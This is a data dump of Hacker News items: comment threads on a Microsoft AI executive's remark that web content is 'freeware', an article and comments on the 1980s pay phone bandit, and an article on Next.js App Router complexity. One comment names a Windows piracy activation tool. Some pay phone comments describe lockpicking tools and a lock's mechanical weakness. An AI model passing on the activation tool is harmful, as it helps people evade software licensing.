people on Earth do it and you do as much as I described to prevent it then you are de facto allowing it. Same thing the MS guy said. Whatever's published on a website is de facto freeware. \"no copyright infringement intended\". That's how it works outside of lawyers offices. Commercial policy is not the law so MS can be as hypocritical as they want. I'm happy that their hypocrisy is going in the right direction this time. reply scotty79 7 hours agoprev> Don’t blame us, the Torment Nexus is established practice! Well, it is. And I for one, am absolutely delighted that some people with money finally have an incentive to accept that after three decades of copyright death throes. reply namds 6 hours agoprevNow that we have established that Microsoft information wants to be free, my next project is wget.ai: wget.ai is a sophisticated real time LLM that trains itself while downloading \"content\". Like any LLM, it predicts the next output token (byte in this case) based on the statistical training. wget.ai is run at temperature zero. In this revolutionary setting it has arrived at the conclusion that the most likely output byte equals the input byte! Armed with this theorem, wget.ai can transform and replicate a Windows 11 download in real time. No copying is involved, the advanced algorithms happen to arrive at input == output. Users of Windows 11 can download activation keys (freeware) from the Internet. reply throwup238 6 hours agoparent> Armed with this theorem, wget.ai can transform and replicate a Windows 11 download in real time. That’s a far bigger crime than IP infringement. reply zeroq 5 hours agoparentprevTo legally run Windows you need a licence, not an activation key. The instalation can already be downloaded for free. reply meiraleal 6 hours agoparentprevIs anyone paying for Windows 11 in 2024? reply cuu508 6 hours agorootparentIf you buy a new laptop with Windows on it, you are [indirectly] paying for Windows. reply AshamedCaptain 6 hours agorootparentprevIs anyone able to _not_ pay for Windows 11 in 2024? It's called the \"Microsoft Tax\" for a reason. reply Zambyte 4 hours agorootparentGNU/Linux, ChromeOS (Google GNU/Linux), Android (Google Linux), MacOS, iOS (and iPadOS is a different thing, right?) Are almost certainly collectively more popular than Windows. Even as a primary / exclusive computer. I think a lot of people are able to not pay for Windows 11 in $CURRENT_YEAR, probably most. reply lye 5 hours agorootparentprevYes, laptops without a windows license are pretty popular in at least some poorer countries. Most buyers install windows anyway and activate it via massgrave and friends, which lets you save 40 to 100 USD, which is a pretty big deal. reply pxeger1 5 hours agorootparentprevLenovo offers its laptops (at the least the customisable models) with your choice of No OS, Windows Home, or Windows Pro. reply omnee 6 hours agorootparentprevEach Windows version has regressed from Windows 7 onwards. To the point that Windows 11 can almost be construed as malware. I'll be using Ubuntu henceforth. reply opless 5 hours agorootparentActually XP was probably the peak of Windows IMHO reply jrm4 5 hours agorootparentCan generally confirm, the only Windows I regularly use is Virtualized XP for some old music making programs I like. reply opless 4 hours agorootparentI guess if you want 64bit support windows 7 is generally better supported than 64bit XP reply LadyCailin 6 hours agorootparentprevBusiness/site licenses, probably. reply pessimizer 5 hours agoparentprevipfs.ai reply edent 9 hours agoprevI like the fact that I can now reproduce any Microsoft content without paying for it. Cheers! Incidentally, some AI chatbots do link to their sources. And it is a good idea to make that an explicit prompt if you're using one that doesn't. It's also worth prompting for how recent their information is. reply greyman 7 hours agoparentI would argue that if I ask ChatGPT something, it doesnt \"reproduce\" what was written on certain website (or at least it shouldn', without attribution). It takes what it scrapped before and re-tell it in its own words. That isn't reproducing, looks like a grey area not yet addressed in copyright laws. I would partially agree with the guy, that yes, that was a social contract since 90's, but before the AI era. Back then this use case wasn't anticipated. reply Retric 6 hours agorootparentThere’s nothing ambiguous from a copyright perspective, it’s a derivative work. People seem to confuse plagiarism in an academic environment from copyright. Simply using your own words doesn’t mean you’re free from copyright. However even when something infringes copyright that doesn’t mean anything necessarily happens. Just look at YouTube’s early history or the mountains of fan fiction out there. reply codetrotter 6 hours agorootparent> Just look at YouTube’s early history But something did happen. Viacom and others sued them, and then YouTube introduced their Content ID system so that they could pay copyright holders for content that others uploaded, as well as to take down videos belonging to copyright holders that did not agree to other people uploading their content. reply Retric 3 hours agorootparent> something did happen Yes, it took 2 years after creation and truly massive amounts of copyright infringement before the lawsuits by copyright owners showed up. OpenAI is getting sued, but don’t expect your requesting a website be rewritten to provoke anything unless you publish such rewritten posts at scale or something. reply coldtea 5 hours agorootparentprev>then YouTube introduced their Content ID system That's for content that's reproduced in part or fully, but verbatim (like a song, movie clip, etc, where Content ID can apply). But the parent's point is you can have trouble even for content where you \"retell\" something \"in your own words\". reply codetrotter 4 hours agorootparentThe part I was responding to is this: > However even when something infringes copyright that doesn’t mean anything necessarily happens. Just look at YouTube’s early history or the mountains of fan fiction out there. This part is talking about uploading a copy of something verbatim, the way I read it. reply asimpletune 5 hours agorootparentprev> in its own words LLM's have no words of their own. Imagine training a LLM vs a group of people from birth on wrong information. The LLM will unquestionably just repeat in \"its own words\" the wrong information, whereas the group of people will of course believe some of the wrong stuff, but they will also doubt a lot of it as well. You could say that an LLM is just not good enough yet so the comparison isn't fair. In other words that people are just even more LLM'ing than the LLM, but there simply is no mechanism for an LLM to go from wrong information to right information. People on the other hand will always doubt, hypothesize, and compare and contrast whatever information they have to at least attempt to form correct answers from correct information. This in a sense is because they actually have their own words. There is, as of today, never been a smart or creative thing an LLM has ever said that doesn't literally come from other people's words. If LLM's are smart, it's because people are smart. reply coldtea 5 hours agoparentprev>I like the fact that I can now reproduce any Microsoft content without paying for it Only if you have the same quality lawyers and financial backup to support them to get you off like MS has. Else what applies to MS doesn't apply to you :) reply danybittel 5 hours agorootparentYou are probably joking, but that is literally what MS said, they don't even hide it. A quote from the register: \"Suleyman (Head of MS AI) did allow that there's another category of content, the stuff published by companies with lawyers.\" (https://www.theregister.com/2024/06/28/microsoft_ceo_ai/) reply moritzwarhier 6 hours agoparentprevLast time I used Copilot, the \"sources\" often didn't support what it said and it seemed like they were obtained by adding search results from feeding the answer into Bing after it had already been generated. And there were of cause tons of SEO slop links among them. reply malfist 6 hours agorootparentI asked ChatGPT for sources and they were impossible to determine if they were real or not. It'd cite things like \"Sky and Telescope magazine\" no edition, no page numbers no year, just a vague unverifiable citation reply mglz 6 hours agoparentprevHas this become any better? Every time I asked ChatGPT for sources it makes up papers, with fragments of real paper titles and topically related authors. The supposed paper itself though can't be found anywhere. reply BlueTemplar 7 hours agoparentprevGood when they do, but depending on what we are discussing, linking to all their sources might be completely impractical. reply rchaud 2 hours agoprevDRM and paywalls for thee, industrial-scale scraping for me. /s It's time for us to build our own miniature versions of Internet Archive with the content that is personally important to us . The powers that be will take it down under the guise of defending copyright, while the bigcos continue to suck up every letter of every page that has a publicly available URL. reply jampekka 6 hours agoprevI find it good that the concept of IP is collapsing, but this shows clearly the corporate dishonesty around it. For decades corporate sites and APIs have pushed all sorts of illegal EULAs and ToSs in attempt to e.g. ban scraping. Now suddenly all of this is scrapped, with of course no explanations given as to why. reply rchaud 2 hours agoparentIP isn't collapsing for anyone with the means and connections to enforce the law. Microsoft is essentially pickpocketing the peasantry, while steering clear of the feudal lords like Netflix and Google, who can hit back. reply sublinear 9 hours agoprevIn a world where physical media is no longer relevant and everything is on the internet, what the hell is \"web content\"? reply the_other 8 hours agoparent> In a world where physical media is no longer relevant Debatable. IMO print is the best medium for long-form written and grapgical narative work. Streaming media can’t be lent and is locked up by excessive and arbitrary (from the consumer’s PoV) rights leveraging. Given physical media is declining, yet more functional for its archive potential, Imd say it was now more relevant than ever. reply latexr 7 hours agorootparentI think you may be interpreting the word “relevant” in a different light than the person you’re replying to. It reads to me as if you’re saying physical media is important for humanity as a whole and the preservation of knowledge, while your parent comment is saying physical media is no longer significant to individual consumers because it’s not their preferred method of consumption. Both connotations can be true at the same time. reply semanticc 9 hours agoparentprevInternet != Web. E.g., an ebook downloaded from Apple Books is not web content, even if it comes from the Internet. reply jsheard 9 hours agorootparentUntil that eBook inevitably gets uploaded to a piracy site. The implication is that if a web crawler can find it anywhere then it's fair game, regardless of provenance. reply BlueTemplar 7 hours agoparentprevLiterally everything isn't, and will never be, but I agree with your gist. Also note how 'content' is corporate-speak (they especially like owning the platforms hosting it) : https://craphound.com/content/Cory_Doctorow_-_Content.html#1 reply prmoustache 6 hours agoprev [–] So basically I can create a whinedows website with microsoft windows logo on it right? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Microsoft’s CEO of AI, Suleyman, in a CNBC interview, claimed that web content has been considered fair use since the 90s, likening it to freeware, which raises legal questions.",
      "The interview discussed the unsustainable financial model of AI and the public's perception of AI-generated content as low quality.",
      "Generative AI vendors argue that their outputs are fair game, but unlike search engines, chatbots do not link to their sources, making their outputs unreliable and indicating a potential AI bubble."
    ],
    "commentSummary": [
      "Web content is generally considered copyrighted unless explicitly stated as public domain, making the claim that all web content is freeware legally dubious.",
      "Authors of open-source code are encouraged to add restrictions to prevent their code from being used to train AI, potentially enabling legal action against companies like Microsoft for unauthorized use.",
      "There is ongoing debate about how AI training intersects with copyright laws, with some arguing that current practices fall under fair use exemptions and that regulation should balance protection with innovation."
    ],
    "points": 151,
    "commentCount": 89,
    "retryCount": 0,
    "time": 1719644985
  },
  {
    "id": 40827650,
    "title": "The 'pay phone bandit' who baffled the FBI in the '80s",
    "originLink": "https://www.mentalfloss.com/posts/pay-phone-bandit-baffled-fbi",
    "originBody": "King of Quarters: The ‘Pay Phone Bandit’ Who Baffled the FBI in the ’80s A rogue genius figured out how to breach coin boxes on the phones, with his haul adding up to as much as $1 million. By Jake RossenJun 25, 2024 Pay phones were everywhere in the 1980s. And they were often full of money. / Ron Bouwhuis/Moment via Getty Images Most of the sightings were the same. Standing in front of the motel clerk or convenience store worker was a man, roughly 5 feet, 9 inches tall, wearing a baseball cap pulled low and almost touching a pair of gold-rimmed eyeglasses. A ponytail stuck out from the back of the hat. A button-down shirt was left untucked. Cowboy boots protruded from under his pant cuffs. Most importantly, the man liked to pay for his food or his room in quarters—rolls and rolls of quarters. In the 1980s, police in Ohio as well as the FBI spent years chasing the man with the ponytail. Unlike a lot of criminals, he didn’t brandish a gun, resort to violence, or put innocent people in his crosshairs. What he did instead was become the most prolific safecracker in modern times, able to breach what was once believed to be the impenetrable, unbreakable strongbox housed in the country’s 1.8 million pay phones. Using means that baffled even security experts, the “pay phone bandit” or “telephone bandit” eluded capture. Quarter by quarter and year after year, he collected an estimated $500,000 to $1 million from these tiny safes. The question was how anyone was ever going to find him. “Unless somebody gets lucky, he’ll probably never get caught,” Ohio Bell Telephone security official Robert Cooperider told The Los Angeles Times in 1987. “He’s well-organized, he’s smart, and he’s not greedy. He only hits a few widely spaced spots each day. He’s always looking over his shoulder, to see if there is a police car, or a telephone company vehicle.” Lock and Key Though it’s hard to imagine today, there was once a time when making a telephone call meant going home, asking to use someone’s phone, or plunking a quarter into a freestanding pay phone. (Or more than one, depending on where you were calling and for how long.) The first public pay-to-use coin-operated phone debuted in Hartford, Connecticut, in 1889. It relied on the honor system, with users depositing coins owed after their call was done. Over the next century, they appeared everywhere, from convenience stores to diners to bus stations. Some were freestanding; others were located inside of a booth to give callers some privacy. While the phones varied somewhat in design, virtually all of them took care to make the coin box virtually impregnable. Bell, then the world’s largest phone carrier, reportedly spent years refining a lock on their box that was thought to be unpickable. If a would-be thief wanted to even have a shot at getting into the box, they’d have to try smashing it open with a sledge hammer or knock it out of the ground with a tractor. Given that the boxes only held about $150 when full, few criminals thought it was worth the effort. A typical pay phone inside of a phone booth. / Marie Hickman/Stone via Getty Images James Clark wasn’t one of those people. The Akron, Ohio, native was a machinist by trade, but he had a nebulous history. According to the Associated Press, in 1968 he was arrested for attempting to arrange a massive counterfeit money deal with contacts in Europe that would have put $50 million phony bills into circulation. He was caught and sentenced to three years in prison. Roughly a decade later, in the early 1980s, Clark devised a new scheme. According to authorities, Clark obtained locks like the ones found on pay phones and created a set of specialized locksmith tools that allowed him to pick the lock. Though different operators had somewhat different lock configurations, Clark zeroed in on specific designs to breach. (His exact tool set and technique has never been publicly disclosed, likely due to security concerns.) Clark’s strategy was simple. Upon arriving at a pay phone, he used a custom tool that he could slip into the margins of the coin box to gauge how much money was inside and whether it was worth pursuing. If it was full, he’d pick up the receiver and pretend to be deep in a conversation. While hunched over the phone, he’d grab his lockpicking tools—which he concealed with an untucked shirttail—and get to work on the lock. Picking one took about 15 minutes. When he got it, the faceplate in front of the coin receptacle came off. Clark would take the box full of change and then replace the faceplate. This last step was key: The phone would continue to operate without the box, giving no physical or mechanical clue it had been tampered with. No one would realize the box was missing until a phone company employee came to retrieve the money—in some cases a week or so later. By that point, Clark would be long gone. Clark ransacked pay phones in Ohio, but he soon branched out to other states. By one estimate, he hit phones in 30 of them, mostly in the South and West. He preferred to stick to phones near the interstate so he could leave in a hurry if he had to. He also seemed to favor phones near country and Western bars, either because he liked the entertainment or because he knew businesses would have profitable phones nearby. He stopped off for lodging and food using his stolen quarters as payment, though he was also known to exchange the coins for bills at banks. He was also seemingly cocky. He used the name James Bell when registering for rooms, a nod to the phone giant he was ripping off on a regular basis. Disconnected Bell was wise to Clark’s scheme early on. As his spree grew, there was a question of whether he was acting alone or whether the phone thefts were part of some interstate crime ring. But closer inspection of the locks revealed a clue. In picking them, Clark left behind a telltale series of scratches that authorities considered almost as good as a fingerprint. It was the one piece of evidence officials had to go on, though there was nothing to compare it to—no national database of lockpicking marks. It wasn’t until 1985 that investigators in Ohio and the FBI got their first real break in the case. A person that news media described as an “informer” told them to look closely at Clark, the Akron native who had once been embroiled in the counterfeit ring of the late 1960s. Clark’s family—his wife and a grown daughter—were still in the Akron area, but Clark himself was nowhere to be found. He had apparently broken off ties with his relatives. Armed with a search warrant, police searched a trailer belonging to Clark and found a smoking gun of sorts: parts of a Bell lock, which they inferred had been used as a practice lock. The lock box on a pay phone can be seen on the lower right. / Carlos E. Serrano/Moment via Getty Images While there was no sign of Clark, at least they could put a face to their suspect’s name. A sketch artist developed a likeness that was used for wanted posters; police approached convenience store workers and motel workers asking if they had seen him. Some had, including one witness who believed they had seen Clark working a phone while being obscured from view by a blue van. The phone’s contents were believed to have been stolen around the time of the sighting. One Bell employee even related a story of confronting Clark while he was in the middle of a heist; Clark, in a rare moment of animus, warned the worker off. Though he apparently never brandished it, Clark was known to carry a .38 revolver. He was seemingly prepared for a confrontation. A warrant was issued for Clark’s arrest in Ohio as well as nationally: The FBI sought him in conjunction with unlawful flight from the state. Bell and other phone operators offered a $25,000 reward for information leading to his arrest. Tips continued to come in, though Clark, sticking close to the interstate, was always a day or so ahead of the law. Not even two appearances on America’s Most Wanted resulted in any meaningful leads. Some officials doubted he would ever be caught. If he wasn’t, there really wasn’t anything Bell or other operators could practically do. Even if he were costing them $70,000 annually, that was still cheaper than trying to replace locks on 1.8 million phones. But in August 1988, Clark’s run came to an end. Acting on another tip, the FBI arrested him in Buena Park, California. True to Clark’s subversive style, there was no protracted struggle: He surrendered without incident; unique lockpicking tools were found in his apartment. Though law enforcement didn’t divulge who or what led them to Buena Park, they indicated Clark’s decision to stay in one place may have helped them catch up to him. Speaking with the press, his attorney, Paul Potter, said Clark had admitted to being the man police had been searching for in 1985 and characterized his client as “an American tinkerer.” Bell’s national spree was a logistically messy one for the criminal justice system. Any one of dozens of states could bring charges. Initially, he was extradited back to Ohio, where he pled guilty in Summit County to five counts of grand theft and another five counts of tampering with coin machines, crimes with a loss valued at just $500. In consideration for the plea, the judge dropped other charges and took a potential 10-year prison sentence off the table. Clark got three years. In 1990, Clark got another sentence in Ohio, this one in Columbus after pleading to one count of theft and two counts of tampering. He got a three-year sentence. Whether he received additional time in other states is unclear. Clark was roughly 50 years old when he was caught. He died in 2012. In a guestbook marking his passing, a commenter observed that Clark was a “thinker and a doer,” which is probably as fitting a eulogy as he could hope for. It’s also unlikely the FBI’s fears of a copycat will ever materialize: As of 2018, there were less than 100,000 pay phones in the country and likely even fewer today. Read More About True Crime: Related Tags MONEY TECHNOLOGY DESIGN FOOD HOME History CRIME WORK EUROPE NEWS Home / HISTORY",
    "commentLink": "https://news.ycombinator.com/item?id=40827650",
    "commentBody": "The 'pay phone bandit' who baffled the FBI in the '80s (mentalfloss.com)140 points by gmays 15 hours agohidepastfavorite42 comments ProjectArcturis 3 hours agoSeems like the hardest part would be getting rid of all the coins. I'm not surprised he got caught, given two appearances on America's Most Wanted, and his tendency to pay for hotel rooms with rolls of quarters. As another comment noted, perhaps he should have opened a laundromat or video arcade to launder the stolen money. reply liendolucas 6 hours agoprevI love these stories to be shared here on HN. There was one also submitted some time ago about a cyclist who wouldn't make it into the olympics (or something like that) and started to rob banks and used his cyclist skills to escape. If I recalled correctly this was in the 80' or 90' and he used to give away the stolen money. Shame I don't have link. reply orzig 6 hours agoparentOne of the best uses of Perplexity.ai! Pasted your text https://www.bicycling.com/news/a26081001/cyclist-turned-bank... reply pimlottc 5 hours agorootparentYou can just Google for “cyclist who robbed banks”, AI isn’t really necessary for this. reply redeux 3 hours agorootparentYou can just use Gopher, you don’t need Google for this. I’m being flippant, obviously but my point is that every now and then a new technology comes along that supplants and older one because it offers a meaningful improvement over the last. AI search vs traditional web search is definitely one of those. reply thfuran 3 hours agorootparentEven if that's true, the example definitely isn't proof of that given that the old technology seems to handle the problem just fine. reply revscat 2 hours agorootparentIf they each give the correct answer in the same number of steps then there’s no reason to prefer one over the other. reply KMag 39 minutes agorootparentMy multiple experiences with ChatGPT hallucination, even at minimum temperature, leaves me preferring a web search answer. Just last week, jq hallucinated three different jq syntaxes that failed to parse. That being said, I had been using web search for several years looking for the Get Smart episode I had seen as a kid in the 1980s where the enemy agent explains that he can't give up his suicide ring because \"That's how it works, if I take it off, my wife will kill me.\" Google Bard found the episode on the first try. So, I tend to fall back to LLMs only when search engines fail me. reply hn_version_0023 33 minutes agorootparentprevMental inertia is the phrase I use for preferring the one you learned first reply pessimizer 3 hours agorootparentprevIt's just as easy or easier to google \"cyclist who robbed banks.\" reply redeux 3 hours agorootparentYou’re not thinking through the whole experience. The search itself is just as easy, sure. You can type the same query into both systems. The difference is in the results. Traditional web search will then return a set of links which may or may not answer you query, it’s up you you to parse them and figure out if they have the content you need or if you need to rephrase your query and try again. AI on the other hand will parse the results for you and return the answer to your prompt directly. That’s a meaningful improvement. reply th0ma5 2 hours agorootparentIf it is not 100% based in reality then no, it isn't. reply aaronharnly 2 hours agorootparentprevThat story seems to be a brief summary, which points to a fuller article here: https://www.chicagomag.com/Chicago-Magazine/February-2019/Bi... reply liendolucas 1 hour agorootparentprevFound it: https://news.ycombinator.com/item?id=29037860 (excellent article). reply mrbluecoat 2 hours agorootparentprevHilarious career path: social work > Catholic priesthood > underwater welding > robbing banks reply Algemarin 14 hours agoprevHere's the America's Most Wanted segment about the guy, James Clark, from 1988: https://youtu.be/e56gA8NBXuQ?t=1204 reply xp84 11 hours agoparentThe details about this guy at the end were hilarious. Apparently he always stays at Motel 6 and eats at 7-11. Totally living it up on Ma Bell’s dime, I see! reply thedrexster 10 hours agorootparentMa Bell's _quarters_, you mean. :) reply ThePowerOfFuet 6 hours agorootparentOnly for the kids. Where do you think \"dropping a dime on someone\" came from? reply macintux 5 hours agorootparentI vaguely recall visiting Boston c1990 and discovering pay phone calls there were still 10¢, while they had been 25¢ in Indiana as long as I could remember. I'd be curious when and where the last ten-cent phone call was made. reply n1b0m 6 hours agoparentprevShame about the sound quality reply alrighty 2 hours agoprevI wonder why the method was to take the box rather than replacing it after emptying it. Would that have made the crime harder to detect? reply spdif899 14 minutes agoparentYeah it seems like the same heist but leaving a random handful of coins behind in the box would have been much more difficult to detect reply Pixelbrick 56 minutes agoprevInspiration for Bruce Sterling's short 'Jim & Irene!' reply Scoundreller 14 hours agoprev> Though it’s hard to imagine today, there was once a time when making a telephone call meant going home, asking to use someone’s phone, or plunking a quarter into a freestanding pay phone Pfffft, what about the classic: \"You have a collect call from PICKMEUPATBILL'S\" ? reply lagniappe 10 hours agoparentCan't forget about his uncle Bobwehadababy Itsaboy reply pimlottc 5 hours agorootparentThe classic Geico commmercial: https://youtu.be/9JxhTnWrKYs?si=imqYkQjwxpATH1VH reply Algemarin 14 hours agoparentprevah yes, passed around countless txtfilez in the '90s... http://cd.textfiles.com/hackersencyc/PHREAK/GENERAL/CALLATT.... http://cd.textfiles.com/hackersencyc/PHREAK/GENERAL/CCF.TXT reply ChrisArchitect 13 hours agoprevWas expecting more phreaking from this story reply imglorp 2 hours agoparentI don't think you could get cash from a payphone by phreaking, back in the day. At most you could get back the coins you put in. After each call, the coins dropped into the lock box. Phreaking was more about sending tones to the CO. reply ChrisArchitect 1 hour agorootparentof course not, phreaking/boxing etc was about avoiding the cash altogether! Just a note that seeing a title about pay phone antics I expected/hoped for more of a hacking angle. Good throwback story nonetheless! reply wintermutestwin 13 hours agoprevOn a related note, I remember in the 80s, coin fed parking meters in Berkeley were systematically cut off. I never knew if it was simple thievery, or some anarchy protest. reply user3939382 8 hours agoparentIt was Cool Hand Luke reply johnnyApplePRNG 13 hours agoprev>By one estimate, he hit phones in 30 of them, Wouldn't they know exactly how many states he did this in since he was the only one that knew how to do it? reply toast0 4 hours agoparentProbably not all instances of non-violent coin (and coin box) theft were recorded or assigned to him. Some instances could have been theft by employees or the coin box was inadverdently not returned, or needed replacement but a replacement wasn't available. Post AT&T breakup means the phone companies were less centralized and organized, presumably, than if this had happened in the 1970s. reply VariableStar 3 hours agoprevNot condoning his actions, but \"a thinker and doer\" is certainly a fitting eulogy, and not a bad one to have in ones grave. reply Mountain_Skies 13 hours agoprevSometime in the 80s we happened across a payphone that was spitting out quarters from the change return, partially jamming the return door in the process. Until then I always assumed that change was held in some kind of side compartment so the same coins inserted could be returned but either someone went crazy jamming it up with quarters earlier or there was a way for the payphone to make change. Wonder if the guy ever thought about running a video arcade or laundromat. It would have been a great way to cover up his source of so many quarters and convert some of them into paper currency in the process. reply jim_lawless 3 hours agoparentI'd read a story a while back about a phone company employee who serviced payphones. He would periodically shut off power to payphones on his route, causing them to trap whatever coins the callers would insert. He'd return at a later time, turning the power back on. The coin return would then empty and he'd get the coins. reply edgineer 8 hours agoparentprevMaybe someone put gum/something to block return coins. Then as people used the machine, the return coins built up. Usually the thief would return days later and remove the gum, along with the coins behind it. reply jonhohle 15 hours agoprev [–] Now I want to see how long it takes Lock Picking Lawyer. Someone mail him a pay phone with a bottle of booze in the coin box! reply Animats 14 hours agoparent [–] About two minutes.[1] It's a disk detainer lock, which requires specialized tools, and it unlocks counterclockwise, which is unusual. The tool: [2] [1] https://www.youtube.com/watch?v=GQxVG-Munqw [2] https://www.sparrowslockpicks.com/products/sparrows-disc-pic... reply Animats 13 hours agorootparent [–] Correction: that's the lock on the GTE clone of the Western Electric payphone. The actual Western Electric version used an unusual lever lock. The later variant, the 30C, is claimed to have never been picked. That's a really good lock design. It's simple, robust, and immune to standard picking techniques. But there is a vulnerability. The blocking wedge, which is only supposed to move along one axis, has some mechanical slop. See [2]. So it's possible to get some feedback on which levers are blocking bolt movement. It's still a huge pain to pick. [1] https://www.mattblaze.org/photos/misc/wecolock/ [2] https://www.youtube.com/watch?v=hXLhCvUgDYQ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "In the 1980s, James Clark, known as the \"Pay Phone Bandit,\" stole up to $1 million in quarters from pay phones across 30 states using custom locksmith tools.",
      "Despite extensive FBI efforts, Clark eluded capture until 1985 when an informer tipped off authorities, leading to his arrest in 1988 and a three-year sentence.",
      "Clark's unique method involved checking if coin boxes were full and picking locks while pretending to use the phone, leaving minimal evidence of theft."
    ],
    "commentSummary": [
      "The 'pay phone bandit' from the 1980s, who eluded the FBI, was eventually caught due to his appearances on America's Most Wanted and his habit of paying for hotel rooms with rolls of quarters.",
      "The story highlights the challenges of dealing with large amounts of stolen coins and suggests that the bandit could have laundered the money by opening a laundromat or video arcade.",
      "The case is a nostalgic look back at a time when pay phones were common, and it also touches on the ingenuity and risks involved in such crimes."
    ],
    "points": 140,
    "commentCount": 42,
    "retryCount": 0,
    "time": 1719631182
  },
  {
    "id": 40828610,
    "title": "It's not just you, Next.js is getting harder to use",
    "originLink": "https://www.propelauth.com/post/nextjs-challenges",
    "originBody": "Next.js Coding It’s not just you, Next.js is getting harder to use Andrew Israel May 14, 2024 • 7 min read I wrote a blog post the other day about how Next.js Middleware can be useful for working around some of the restrictions imposed by server components. This led to some fun discussions in the world about whether this was a reasonable approach or if Next.js DX was just... bad. From my perspective, Next.js’ App Router has two major problems that make it difficult to adopt: You need to understand a lot about the internals to do seemingly basic tasks. There are many ways to shoot yourself in the foot that are opt-out instead of opt-in. To understand this better, let’s look at its predecessor, the Pages Router. A quick look at the Pages Router When I first learned about Next.js, the main “competitor” was Create React App (CRA). I was using CRA for all my projects, but I switched to Next.js for two reasons: I liked file-based routing because it allowed me to write less boilerplate code. Whenever I ran the dev server, CRA would open http://localhost:3000 (which gets annoying fast), and Next.js didn’t. The second one is maybe a little silly, but to me, Next.js was: React with better defaults. And that’s all I really wanted. It wasn’t until later that I discovered the other features Next.js had. API routes were exciting as they gave me a serverless function without setting up any extra infra - super handy for things like “Contact Us” forms on a marketing site. getServerSideProps allowed me to run basic functions on the server before the page loaded. Those concepts were powerful, but they were also simple. An API route looked and acted a lot like every other route handler. If you had used Express or Cloudflare Workers, you can squint at a route handler and all the concepts you already knew translated. getServerSideProps was a little different, but once you understood how to get a request and the format of the response, it turned out to be pretty straightforward too. The App Router release The Next 13 release introduced the App Router, adding many new features. You had Server Components which allowed you to render your React components on the server and reduce the amount of data you needed to send to your client. You had Layouts, which allowed you to define aspects of your UI shared by multiple routes and didn’t need to be re-rendered on every navigation. Caching got… more sophisticated. And while these features were interesting, the biggest loss was simplicity. When a framework doesn’t do what you think it will do A fairly universal experience as a developer is banging your head against the wall and yelling, “Why does this not work?” Everyone’s been there, and it always sucks. For me, it’s even more painful if it feels like it’s not a bug in my code but a misunderstanding of how things are supposed to work. You are no longer yelling, “Why does this not work?” but rather, “Why does this work… like that?” The App Router, unfortunately, is full of these kinds of subtleties. Let’s look back at my original issue: I just want to get the URL in a Server Component. Here’s an answer to a popular Github issue about the topic, and I’ll post part of it here: If we take a step back, the question \"Why can't I access pathname or current URL?\" is part of a bigger question: \"Why can't I access the complete request and response objects?\" Next.js is both a static and dynamic rendering framework that splits work into route segments. While exposing the request/response is very powerful, these objects are inherently dynamic and affect the entire route. This limits the framework's ability to implement current (caching and streaming) and future (Partial Prerendering) optimizations. To address this challenge, we considered exposing the request object and tracking where it's being accessed (e.g. using a proxy). But this would make it harder to track how the methods were being used in your code base, and could lead developers to unintentionally opting into dynamic rendering. Instead, we exposed specific methods from the Web Request API, unifying and optimizing each for usage in different contexts: Components, Server Actions, Route Handlers, and Middleware. These APIs allow the developer to explicitly opt into framework heuristics like dynamic rendering, and makes it easier for Next.js to track usage, breaking the work, and optimizing as much as possible. For example, when using headers, the framework knows to opt into dynamic rendering to handle the request. Or, in the case of cookies, you can read cookies in the React render context, but only set cookies in a mutation context (e.g. Server Actions and Route Handlers) because cookies cannot be set once streaming starts. For what it’s worth, this response is incredible. It’s well written, it helps me understand a lot of the underlying issues, and it gives me insight into the tradeoffs associated with different approaches that I absolutely didn’t think about. That being said, if you are a developer and all you are trying to do is get the URL in a Server Component, you probably read this and left with 5 more things to Google before realizing you probably have to restructure your code. This post summarizes my feelings about it: It’s not that it’s necessarily incorrect - it’s unexpected. That original post also mentioned a few other subtleties. One common footgun is in how cookies are handled. You can call cookies().set(\"key\", \"value\") anywhere and it will type-check, but in some cases it will fail at runtime. Compare these to the “old” way of doing things where you got a big request object and could do anything you wanted on the server, and it’s fair to say that there’s been a jump in complexity. I also need to point out that the “on-by-default” aggressive caching is a rough experience. I’d argue that way more people expect to opt-in to caching rather than dig through a lot of documentation to figure out how to opt-out. I’m sure other companies had similar issues to us, but at PropelAuth we often got bug reports that weren’t bugs but amounted to “You thought you made an API call, but you didn’t, and you are just reading a cached result.” And all of this begs the question, who are these features and optimizations for? It’s very hard to build a one-size-fits-all product All of these features that I’m painting as overly complex do matter for some people. If you are building an e-commerce platform, for example, there are some great features here. Your pages load faster because you send less data to the client. Your pages load faster because everything is aggressively cached. Your pages load faster because only parts of the page need to re-render when the user navigates to a new page. And in the e-commerce world, faster page loads means more money, so you would absolutely take the tradeoff of a more complex framework for them. But if I’m building a dashboard for my SaaS application… I don’t really care about any of that. I care way more about the speed at which I ship features, and all that complexity becomes a burden on my dev team. My personal experience and frustrations with the App Router will be different than another person’s because we have different products, different use cases, and different resources. Speaking specifically as a person who spends a lot of time writing and helping other people write B2B SaaS applications, the App Router DX is a big step down from the Pages Router. Is this inevitable for frameworks as they grow? As products/frameworks grow, they tend to get more complicated. Customers ask for more things. Bigger customers ask for more specific things. Bigger customers pay more so you prioritize and build those more specific things. Customers who previously loved the simplicity of it all get annoyed at how complicated things feel and… oh, look at that, a new framework has popped up that’s way simpler. We should all switch to that! It’s challenging to avoid this, but one way to mitigate it is to not make everyone deal with the complexity that only some people need. Just because something is recommended, doesn’t mean it’s right for you One of my biggest issues with the App Router was just this: Next.js has officially recommended that you use the App Router since before it was honestly ready for production use. Next.js doesn’t have a recommendation on whether TypeScript, ESLint, or Tailwind are right for your project (despite providing defaults of Yes on TS/ESLint, No to Tailwind - sorry Tailwind fans), but absolutely believes you should be using the App Router. The official React docs don’t share the same sentiment. They currently recommend the Pages Router and describe the App Router as a “Bleeding-edge React Framework.” When you look at the App Router through that lens, it makes way more sense. Instead of thinking of it as the recommended default for React, you can think of it more like a beta release. The experience is more complicated and some things that were easy are now hard/impossible, but what else would you expect from something that’s still “Bleeding-edge?” So when you are picking a framework for your next project, it’s worth recognizing that there are still many rough edges in the App Router. You might have better luck reaching for a different tool that’s more suited to your use case.",
    "commentLink": "https://news.ycombinator.com/item?id=40828610",
